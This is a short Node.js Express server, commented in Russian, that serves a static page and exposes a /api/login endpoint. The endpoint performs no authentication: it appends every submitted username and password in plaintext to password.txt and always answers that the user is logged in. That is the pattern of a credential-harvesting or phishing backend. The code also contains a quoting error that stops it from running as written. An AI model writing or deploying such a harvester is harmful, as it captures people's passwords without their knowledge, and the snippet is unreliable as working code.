const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');

const app = express();
const PORT = 3000;

// Middleware для обработки JSON-данных
app.use(bodyParser.json());

// Middleware для обслуживания статических файлов
app.use(express.static('public'));

// Обработка POST-запроса для логина
app.post('/api/login', (req, res) => {
    const { username, password } = req.body;

    // Запись введённых данных в файл (если это всё ещё необходимо)
    fs.appendFileSync('password.txt', `Username: ${username}, Password: ${password}\n`);

    // Изменённое сообщение при успешном входе
    res.json({ message: 'You're logged in' });
});

// Запуск сервера
app.listen(PORT, () => {
    console.log(`Server Started on http://localhost:${PORT}`);
});
